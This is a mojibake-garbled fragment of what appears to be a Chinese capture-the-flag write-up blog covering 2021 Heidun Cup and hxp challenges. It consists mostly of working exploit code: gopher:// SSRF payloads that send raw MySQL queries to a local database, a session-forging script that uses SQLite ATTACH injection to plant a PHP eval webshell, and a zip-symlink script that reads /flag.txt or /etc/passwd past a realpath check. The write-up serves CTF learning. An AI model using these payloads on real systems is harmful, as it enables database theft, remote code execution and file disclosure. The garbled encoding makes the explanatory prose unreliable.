#â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%75%73%65%20%63%74%66%3b%73%68%6f%77%20%63%6f%6c%75%6d%6e%73%20%66%72%6f%6d%20%75%73%65%72%73%3b%01%00%00%00%01â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%20%00%00%00%03%75%73%65%20%63%74%66%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%70%61%73%73%77%6f%72%64%3b%01%00%00%00%01â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1d%00%00%00%03%75%73%65%20%63%74%66%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73%3b%01%00%00%00%01â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1d%00%00%00%03%75%73%65%20%63%74%66%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73%3b%01%00%00%00%01â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01â€ } r=requests.post(url=url,data=data,proxies={â€œhttpâ€:None}) print(r.text) ``` æˆåŠŸå¯¼å‡ºphpæ–‡ä»¶ å¾—åˆ°flag \\ICS-å·¥æ§æ§åˆ¶è½¯ä»¶åˆ†æ** IDAåç¼–è¯‘åï¼Œå‘ç°åœ¨WinMainå‡½æ•°å†…éƒ¨å­˜åœ¨å¯ç–‘çš„å¼‚æˆ–è¡Œä¸ºï¼Œæœ‰ç‚¹æ€€ç–‘æ˜¯flagçš„åŠ å¯†ï¼Œç‚¹å‡»å»è¿½è¸ªå ç«Ÿç„¶æ˜¯ä¸€æ®µæŒ‡ä»¤ï¼ŒæŒ‰ç†è¯´åº”è¯¥æ˜¯ä¸€æ®µå­—ç¬¦æ‰å¯¹ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯æ˜¾ç¤ºæœ‰é—®é¢˜ï¼Œæœ‰IDAå¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸² å…ˆè¯•è¯•å‰4ä¸ªå­—ç¬¦çš„å¼‚æˆ–ç»“æœï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆ è¾“å‡ºçš„ç»“æœå°±æ˜¯flagï¼Œåé¢åªéœ€æŠŠåé¢å†…å®¹åŠ ä¸Šå³å¯ Master Of VM é¦–å…ˆç”¨ç»™çš„è´¦å·å¯†ç sshè¿ä¸Šé¶æœº æŸ¥çœ‹åˆ°æ ¹ç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªflagæ–‡ä»¶å’Œä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œflagæ— æ³•è¯»å– å¯æ‰§è¡Œæ–‡ä»¶æ‰§è¡Œäº†ä¸€ä¸‹ï¼Œè²Œä¼¼æ˜¯ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œä½†æ˜¯ä¸è®©åˆ›å»ºæ–‡ä»¶ï¼Œå¦åˆ™åº”è¯¥å¯ä»¥ç”¨æ¥å¯¹æ¯”ï¼Ÿç„¶åé€€å‡ºå»åˆ°æ ¹ç›®å½•ä¸‹æ‰¾æœ‰æ²¡æœ‰å¯èƒ½å¯ä»¥å†™çš„æ–‡ä»¶æ¥å®ç°è¿™ä¸ªæƒ³æ³•ï¼Œç»“æœåˆ°äº†ç›®å½•å‘ç°äº†å¦å¤–ä¸€ä¸ªflagæ–‡ä»¶","link":"/2021/12/09/2021%E9%BB%91%E7%9B%BE%E6%9D%AF/"},{"title":"2021hxp","text":"shittyçœ‹æºç ï¼Œæ˜¯ä¸€ä¸ªsqliteï¼Œä½†æ˜¯çœ‹äº†ä¸€ä¸‹dockeræ–‡ä»¶ï¼Œæœ€ç»ˆæ˜¯è¦è®©æˆ‘ä»¬æ‰§è¡Œ/readflagçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è‚¯å®šè¦å‘½ä»¤æ‰§è¡Œï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å†™shellè¿›å» ä¹‹å‰å­¦è¿‡sqliteå†™shellçš„ï¼Œæ‰€ä»¥ç›´æ¥æ‹¿å‡ºæ¥çœ‹çœ‹ï¼Œå¯ä»¥ä½¿ç”¨attachå†™shellï¼Œè€Œä¸”ä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆè¿‡æ»¤ä¹‹ç±»çš„ï¼Œä½†æ˜¯è¦åœ¨å“ªä¸ªè¯­å¥å†™å€’æ˜¯ä¸ªé—®é¢˜ æˆ‘ä»¬å¯æ§çš„å‘½ä»¤æ‰§è¡Œè¯­å¥åªæœ‰è¿™ä¸¤æ¡ function insert_entry($db, $content, $user_id) { $sth = $db-&gt;prepare('INSERT INTO entry (content, user_id) VALUES (?, ?)'); $sth-&gt;execute([$content, $user_id]);}function delete_entry($db, $entry_id, $user_id) { $db-&gt;exec(&quot;DELETE from entry WHERE {$user_id} &lt;&gt; 0 AND id = {$entry_id}&quot;); ç¬¬ä¸€ä¸ªexecute execute(sql[, parameters])æ‰§è¡Œä¸€æ¡ SQL è¯­å¥ã€‚ å¯ä»¥ä½¿ç”¨ å ä½ç¬¦ å°†å€¼ç»‘å®šåˆ°è¯­å¥ä¸­ exec å¯ä»¥æ‰§è¡Œå¤šæ¡SQLæŒ‡ä»¤ ä½†å…¶å®çœ‹äº†ä¸€ä¸‹ï¼Œä¹Ÿç¡®å®æ˜¯ä¸‹é¢è¿™ä¸ªdelete_entryèƒ½æ„é€ é—­åˆç„¶åå»å‘½ä»¤æ‰§è¡Œå¤šæ¡è¯­å¥ã€‚ åœ¨è¿™ä¸ªè¯­å¥å½“ä¸­ï¼Œæœ‰ä¸‰ä¸ªå˜é‡ï¼Œè·Ÿäº†ä¸€ä¸‹ï¼Œå‘ç°åªæœ‰user_idæ˜¯å¯æ§çš„ï¼Œè€Œuser_idæ˜¯å‰é¢çš„seesionçš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦ä¼ªé€ session é‚£ä¹ˆç°åœ¨æ€è·¯å…¶å®å°±å¾ˆæ˜ç¡®äº†ï¼š ä¼ªé€ session-&gt;sqliteä½¿ç”¨attachå†™é©¬ é¦–å…ˆçœ‹çœ‹ä»–çš„sessionæ˜¯å¦‚ä½•ç”Ÿæˆçš„ã€‚ä¸»è¦æ˜¯ä»¥ä¸‹è¿™éƒ¨åˆ†å†…å®¹ï¼Œ else { $session = explode('|', $_COOKIE['session']); if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) { exit(); } $id = $session[0]; $mac = $session[1];} ä»¥å‰çœ‹åˆ°ä¼ªé€ sessionéƒ½è§‰å¾—å¾ˆéº»çƒ¦ï¼Œä¸æƒ³åšï¼Œç°åœ¨æ˜¯æ—¶å€™å»é¢å¯¹å®ƒäº† è¿™é¢˜ä¼ªé€ sessionçš„æ¼æ´åœ¨äºcryptï¼Œé¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œhash_qualsæ˜¯å¯¹æ¯”ä¸¤ä¸ªå‚æ•°çš„å“ˆå¸Œå€¼æ˜¯å¦ç›¸åŒï¼Œç„¶åcryptæœ‰ä¸€ä¸ªè¿™æ ·çš„ç‰¹æ€§ï¼Œç”±äºå®ƒæ˜¯å¯ç”¨äºŒè¿›åˆ¶çš„å½¢å¼è¾“å‡ºï¼Œåˆ™ä¼šå¯¼è‡´å­˜åœ¨ä»¥0å­—èŠ‚å¼€å¤´çš„idç»è¿‡md5åŠ å¯†ä»¥åçš„å€¼å’Œmacå€¼ç›¸ç­‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰¾åˆ°è¿™ä¸ªmacå€¼ï¼Œç„¶åå†å»é‡æ–°è·‘idï¼Œè®©ä»–å’Œæˆ‘ä»¬çš„æ¶æ„è¯­å¥æ‹¼æ¥ä»¥åçš„å€¼ç»è¿‡cryptåä¸º0å­—èŠ‚å°±å¯ä»¥ç»•è¿‡äº†ã€‚é‚£ä¹ˆå¦‚ä½•è·å–è¿™ä¸ªmacå€¼å‘¢ï¼Ÿå°±æ˜¯å»å¾ªç¯è·‘ï¼Œå› ä¸ºè¦å¾—åˆ°ä¸¤ä¸ªä¸€æ ·çš„macå€¼åŸºæœ¬ä¸Šæ˜¯ä¸å¯èƒ½çš„ï¼Œé™¤éè¿™ä¸¤ä¸ªidéƒ½ä¸º0å­—èŠ‚idã€‚ æ¥ä¸‹æ¥å†™ä¸€ä¸‹è„šæœ¬: è¿™é‡Œå‘ç°äº†ä¸€ä¸ªä»¥å‰æ²¡å‘ç°çš„ç»†èŠ‚ã€‚ã€‚ã€‚ åœ¨pythonä¸­s=request.sessions.get()ç”¨äº†ç¬¬ä¸€å¥ä»¥åï¼Œæ¥ä¸‹æ¥åœ¨ç”¨sæ¥å‘é€è¯·æ±‚ï¼Œæ­¤æ—¶å·²ç»è¡¨ç¤ºåœ¨åŒä¸€ä¸ªä¼šè¯ä¸‹äº†ï¼Œå¦‚æœæƒ³è¦å¾—åˆ°ä¸åŒçš„cookieï¼Œéœ€è¦ç›´æ¥ç”¨requests.get()æ¥å‘é€è¯·æ±‚ æœ€åä½¿ç”¨å¤šçº¿ç¨‹å»è·‘ï¼Œå¯ä»¥æé«˜æˆåŠŸç‡ import requestsfrom urllib.parse import unquotefrom urllib.parse import quoteimport threadingimport randomurl=&quot;http://110.42.133.120:8080/&quot;def get_mac(): mac_list=[] rtmac=&quot;&quot; while True: try: re=requests.get(url) session=unquote(re.headers['Set-Cookie']) session=session.split(&quot;=&quot;)[1].split(&quot;|&quot;) orgin_id=session[0] mac=session[1] if mac in mac_list: return mac else: mac_list.append(mac) print(&quot;orgin_id&quot;,orgin_id) print(&quot;mac&quot;, mac) except: passdef writ_shell(mac,id): payload=&quot;1;ATTACH DATABASE '/var/www/html/data/tlif3.php' AS shell ;create TABLE shell . exp ( webshell text);insert INTO shell . exp (webshell) VALUES (x'3c3f706870206576616c28245f4745545b22726464225d293b3f3e');--&quot; session = quote(&quot;{payload}{id}|&quot;.format(payload=payload,id=i)+mac) cookie = { &quot;session&quot;:session, } res = requests.get(url,cookies=cookie) if &quot;Blog&quot; in res.text or int(len(res.text)&gt;0): print(cookie) print(res.content) data={ &quot;content&quot;:&quot;hello&quot; } pushcontent=requests.post(url,data=data,cookie=cookie) print(pushcontent.content) print(&quot;\\n::delete::\\n&quot;) data={ &quot;delete&quot;:&quot;1&quot; } delete=requests.post(url,data=data,cookie=cookie) print(delete.content) exit(-1)if __name__==&quot;__main__&quot;: mac=get_mac() #mac=&quot;a&quot; for num in range(1000): print(&quot;num: &quot;, num) thread_list = [] for i in range(0, 20): id = random.randint(1, 9223372036854775807) m = threading.Thread(target=writ_shell, args=(mac,id)) thread_list.append(m) for m in thread_list: m.start() for m in thread_list: m.join() unzipper&lt;?phpsession_start() or die('session_start');$_SESSION['sandbox'] ??= bin2hex(random_bytes(16));$sandbox = 'data/' . $_SESSION['sandbox'];$lock = fopen($sandbox . '.lock', 'w') or die('fopen');flock($lock, LOCK_EX | LOCK_NB) or die('flock');@mkdir($sandbox, 0700);chdir($sandbox) or die('chdir');if (isset($_FILES['file'])) system('ulimit -v 8192 &amp;&amp; /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . ' . escapeshellarg($_FILES['file']['tmp_name']));else if (isset($_GET['file'])) if (0 === preg_match('/(^$|flag)/i', realpath($_GET['file']) ?: '')) readfile($_GET['file']);fclose($lock); çœ‹åˆ°å‹ç¼©æ–‡ä»¶é©¬ä¸Šå°±æƒ³åˆ°è½¯é“¾æ¥äº†ï¼Œæ­£å¥½ä¹‹å‰æœ‰ä¸€ä¸ªæ¯”èµ›æ²¡å»åšåˆ°ï¼Œè¿™æ¬¡æ­£å¥½å¤ç°ç†Ÿæ‚‰ä¸€ä¸‹ã€‚ å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œå‘ç°åœ¨è¯»æ–‡ä»¶çš„æ—¶å€™ä¼šç»è¿‡ä¸€äº›è¿‡æ»¤æ“ä½œï¼Œæœ‰ä¸ªrealpathçš„å‡½æ•° expr1?:expr3 expr1åœ¨æ±‚å€¼æ—¶å¦‚æœä¸ºtrueè¿”å›expr1å¦åˆ™è¿”å›expr3 æ¥ä¸‹æ¥ç†è§£ ç†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯è½¯é“¾æ¥ è½¯é“¾æ¥ï¼š ä¿å­˜äº†å…¶ä»£è¡¨çš„æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œæ˜¯å¦å¤–ä¸€ç§æ–‡ä»¶ï¼Œåœ¨ç¡¬ç›˜ä¸Šæœ‰ç‹¬ç«‹çš„åŒºå—ï¼Œè®¿é—®æ—¶æ›¿æ¢è‡ªèº«è·¯å¾„ã€‚ é€šä¿—æ¥è¯´å°±æ˜¯å°†ä¸€ä¸ªæ–‡ä»¶Açš„ç»å¯¹è·¯å¾„æ”¾åœ¨å¦ä¸€ä¸ªæ–‡ä»¶Bé‡Œé¢ï¼Œè®¿é—®è¿™ä¸ªBæ–‡ä»¶çš„è·¯å¾„å®é™…ä¸Šæ˜¯è®¿é—®Aæ–‡ä»¶ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•ä¸Šä¼ ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨readfileåŒæ ·å¯ä»¥è¯»å–å…¶ä¸­çš„è½¯é“¾æ¥ ä½†æ˜¯åœ¨è¿™é¢˜ï¼Œæ²¡æœ‰é‚£ä¹ˆå®¹æ˜“ï¼Œå› ä¸ºä»–æ–°å¢åŠ äº†ä¸€ä¸ªrealpathï¼Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†realpathä»¥åï¼Œæ˜¾ç¤ºçš„å°±æ˜¯ä»–çš„è½¯é“¾æ¥äº†ï¼Œæ­¤æ—¶è¦æ˜¯ç”¨readfile+è½¯é“¾æ¥è¯»å–flagå°±ä¸å¤ªå¯èƒ½äº† è¿™é‡Œè¿˜éœ€è¦è¡¥å……ä¸€ç‚¹ï¼Œè½¯é“¾æ¥éœ€è¦å’Œzipç»„åˆæ‰èƒ½å‘æŒ¥ä½œç”¨ï¼Œè¿™æ ·è§£å‹ä»¥åçš„è½¯é“¾æ¥æ­¤æ—¶é“¾æ¥åˆ°æ‰æ˜¯è¯¥å°æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚å¦‚æœåªæ˜¯å•çº¯è½¯é“¾æ¥å­˜åœ¨æ˜¯ä¸è¡Œçš„ã€‚æ¯”å¦‚è¯´æˆ‘åœ¨Aç”µè„‘ä¸Šåˆ›å»ºäº†ä¸€ä¸ªè½¯é“¾æ¥ï¼Œå°†è¿™ä¸ªè½¯é“¾æ¥æ–‡ä»¶æ”¾åˆ°Bä¸Šï¼Œè®¿é—®è¿™ä¸ªè½¯é“¾æ¥æ–‡ä»¶çš„æ—¶å€™ï¼Œæ•°æ®ä»ç„¶æ˜¯Aç”µè„‘ä¸Šçš„ã€‚ é‚£ä¹ˆè¿™ä¸ªé¢˜ç›®çš„é‡ç‚¹å°±æ˜¯ç»•è¿‡è¿™ä¸ªæ­£åˆ™åŒ¹é… è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå°trickï¼Œreadfileæ˜¯å¯ä»¥è¯»å–phpçš„ä¼ªåè®®çš„ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªzipï¼Œé‡Œé¢åŒ…å«ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯ä¼ªåè®®ï¼Œä¼ªåè®®è¯»å–çš„æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œå¦ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹å°±æ˜¯flagçš„åœ°å€ ä¸Šé¢è¿™ä¸ªæ–¹æ³•ä¸è¡Œï¼Œæ‰€ä»¥å†æƒ³æƒ³ï¼Œé¦–å…ˆreadfileå¯ä»¥è¯»å–åè®®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¼ªåè®®ï¼Œè¿™ç‚¹æ˜¯ç¡®å®šçš„ï¼Œé‚£ä¹ˆè¦å¦‚ä½•ä½¿ç”¨ä¼ªåè®®æ¥ç»•è¿‡å‘¢ï¼Ÿ æˆ‘ä»¬çŸ¥é“ï¼Œé€šè¿‡realpathï¼Œè½¯é“¾æ¥å°±ä¼šè¢«ç›´æ¥è½¬åŒ–ä¸ºçœŸå®é“¾æ¥ï¼Œå°±æ— æ³•ç»•è¿‡æ­£åˆ™ï¼Œä½†å¦‚è¿‡æˆ‘ä»¬å°†ä¸€ä¸ªè¯»å–æ–‡ä»¶çš„åè®®ä½œä¸ºå„ä¸ªç›®å½•ä¸²è”èµ·æ¥ï¼Œè¿™æ ·åœ¨realpathè¿™é‡Œï¼Œä¼šè¢«è§£æä¸ºä¸€ä¸ªç›®å½•ï¼Œè€Œåœ¨readfileåˆä¼šè¢«è§£æä¸ºåè®®ç¬¬ä¸€çº§ç›®å½•æ˜¯file:ç¬¬äºŒçº§ç›®å½•æ˜¯/varè¿™æ ·ä¸€ç›´å¾€ä¸‹ç„¶åå®Œæ•´ç›®å½•è¿æ¥èµ·æ¥å°±æ˜¯ï¼šfile:/var/www/html/data/xxxxx/è½¯é“¾æ¥å½“æˆ‘ä»¬è®¿é—®file:///var/www/html/data/xxxxx/çš„æ—¶å€™ç»è¿‡realpathå¤„ç†ä»¥åä¼šå˜æˆfile:/var/www/html/data/xxxxx/è½¯é“¾æ¥æ­¤æ—¶åˆ™æ˜¯æŒ‡å‘ä¸€ä¸ªç©ºç›®å½•è€Œåœ¨readfileä¸­åˆæ˜¯file:///var/www/html/data/xxxxx/è½¯é“¾æ¥æ­¤æ—¶å°±å¯ä»¥è¯»å–åˆ°flagäº† ä½†æ˜¯è¿™æ ·çš„è¯åœ¨æ„é€ å‹ç¼©åŒ…çš„æ—¶å€™å…¶å®æŒºéº»çƒ¦çš„ å¦å¤–ä¸€ä¸ªè€ƒç‚¹å°±æ˜¯é€šè¿‡sessionå¾—åˆ°æ–‡ä»¶ä¿å­˜è·¯å¾„äº†ï¼Œå¼€äº†sessionï¼Œå¯ä»¥ç›´æ¥ session_start() or die('session_start');$_SESSION['sandbox'] ??= bin2hex(random_bytes(16));$sandbox = 'data/' . $_SESSION['sandbox']; å› ä¸ºæœ‰dockerï¼Œç›´æ¥findä¸€ä¸‹sessionçš„ä¿å­˜è·¯å¾„å°±å¯ä»¥äº† æ‰€ä»¥æˆ‘ä»¬çš„è§£é¢˜æ­¥éª¤ä¹Ÿå¾ˆæ˜äº†äº† è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¥‡æ€ªçš„äº‹ï¼Œå½“æˆ‘åœ¨æœ¬åœ°æµ‹è¯•çš„æ—¶å€™ï¼Œæ€ä¹ˆå¼„éƒ½æ˜¯false åé¢åˆå»ç…äº†ä¸€ä¸‹æºç æ‰å‘ç°ï¼ŒåŸæ¥å®ƒæ˜¯åœ¨æ‰€åˆ›å»ºçš„æ–°çš„ç›®å½•ä¸‹è¿›è¡Œæ“ä½œçš„ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼ï¼ï¼ï¼æ‰€ä»¥æ­¤æ—¶realpathåœ¨æ£€æŸ¥file://xxxçš„æ—¶å€™è¿”å›çš„å°±æ˜¯trueï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªï¼Œè¿”å›çš„å°±æ˜¯falseäº† $lock = fopen($sandbox . '.lock', 'w') or die('fopen');fclose è®²ä¸€ä¸‹è¿™ä¸ªè„šæœ¬çš„æ ¸å¿ƒçš„æ€è·¯ï¼Œå°±æ˜¯åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œè¿˜æœ‰ä¸€ä¸ªè½¯é“¾æ¥ï¼Œå°†ä¸¤ä¸ªåˆå¹¶å‹ç¼©å³å¯ import requestsimport reimport oss=requests.session()url=&quot;http://110.42.133.120:1234&quot;sess_r=s.get(url)sess=sess_r.headers['Set-Cookie']sess_f=re.findall(r'=(.*?);',sess)print(sess_f)file_path=f'/var/lib/php/sessions/sess_{sess_f[0]}'sandbox=s.get(url+f'/?file={file_path}')print(sandbox.text)flag_path=re.findall(r'&quot;(.*?)&quot;',sandbox.text)print(flag_path)#åˆ›å»ºzipæ–‡ä»¶soft_fi=&quot;leak&quot;zip_path=f'file:///var/www/html/data/{flag_path[0]}/{soft_fi}'os.system(&quot;rm -rf leak go.zip file:&quot;)os.system(f&quot;ln -s /flag.txt leak&quot;)os.system(f&quot;mkdir -p {zip_path}&quot;)os.system(f&quot;zip --symlinks -r go.zip file: {soft_fi}&quot;)file={ &quot;file&quot;:open('./go.zip','rb')}r=s.post(url,files=file)flag=s.get(url+f'/?file={zip_path}')print(flag.text) å°ç»“è¿™é“é¢˜å…¶å®æ ¸å¿ƒæ€è·¯ä¸éš¾ï¼Œä½†æ˜¯æœ‰å¾ˆå¤šç»†èŠ‚è¦æ³¨æ„ï¼Œè€Œä¸”å¯èƒ½ä¹Ÿæ˜¯è‡ªå·±ç†è§£ä¸å¤Ÿé€å½»ï¼Œå®¡è®¡èƒ½åŠ›è¿˜ä¸å¤Ÿå¼ºï¼Œå¯¼è‡´å¾ˆå¤šç»†èŠ‚æ²¡æ³¨æ„åˆ°ï¼Œå¡äº†å¾ˆä¹…ã€‚è¿™é‡Œé‡æ–°ç†ä¸€ä¸‹ã€‚ 1.å®¡è®¡æºç ï¼Œå‘ç°ä»£ç æ˜¯å¯ä»¥ç›´æ¥æŸ¥è¯¢ä¸Šä¼ å†…å®¹çš„ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œå› ä¸ºå¼€äº†fopen 2.å‘ç°è·¯å¾„æ˜¯å­˜å‚¨åœ¨sessionå½“ä¸­ï¼Œå¯ä»¥é€šè¿‡dockeræ‰¾åˆ°sessionå­˜æ”¾è·¯å¾„ 3.ä½¿ç”¨äº†unzipè§£å‹æŒ‡ä»¤ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è½¯é“¾æ¥è¯»å–æ–‡ä»¶ï¼Œä½†æ˜¯ç”±äºæ­£åˆ™åŒ¹é…çš„å­˜åœ¨ï¼Œä¸»è¦æ˜¯realpathï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨è½¯é“¾æ¥ï¼Œéœ€è¦ç»•è¿‡ã€‚ 3.å› ä¸ºreadpathå¯ä»¥è¯»å–urlï¼Œä¹Ÿå³å¯ä»¥ä½¿ç”¨ä¼ªåè®®æ¥è¯»å–æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªç”±åè®®ç»„æˆçš„æ–‡ä»¶ç›®å½•çº§ï¼Œå½“realpathè¯»å–è¿™ä¸ªä¼ªåè®®çš„æ—¶å€™ï¼Œä¼šå°†å…¶è§†ä¸ºä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œä»è€Œç»•è¿‡éªŒè¯ï¼ŒæŒ‡çš„ä¸€æçš„æ˜¯ï¼Œå› ä¸ºæ­¤æ—¶å¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„è¯»å–æ‰æœ‰è¿™ä¸ªæ“ä½œçš„å¯èƒ½ã€‚è€Œæˆ‘ä»¬åœ¨å¦å¤–åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥ï¼Œè€Œé’ˆå¯¹file://åè®®è€Œè¨€ï¼Œè¯»å–çš„æ˜¯ç»å¯¹è·¯å¾„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥è¯»å–åˆ°è¿™ä¸ªè½¯é“¾æ¥ã€‚ è§£æ³•äºŒè¿™ä¸ªè§£æ³•äºŒæ˜¯é˜Ÿé‡Œå¤§å¸ˆå‚…æƒ³çš„ï¼Œç®€ç›´å°±æ˜¯å¤©æ‰ï¼Œé‡ç‚¹åœ¨äºä»–é‚£ä¸ª/etc/passwdï¼Œçœ‹ä¸€ä¸‹æˆ‘çš„ï¼Œè¿˜å»æ‰¾sessionï¼Œå°±å¾ˆéº»çƒ¦ï¼Œä»–ç›´æ¥è¦†ç›–ä¸€ä¸‹ï¼Œç›´æ¥è¯»/etc/passwdå°±å¯ä»¥è¯»åˆ°flagäº†ã€‚ import requestsimport zipfileimport osurl = &quot;http://65.108.176.76:8200/&quot;file_name = &quot;file:///flag.txt&quot;file_ln = &quot;/etc/passwd&quot;os.system(&quot;rm -f 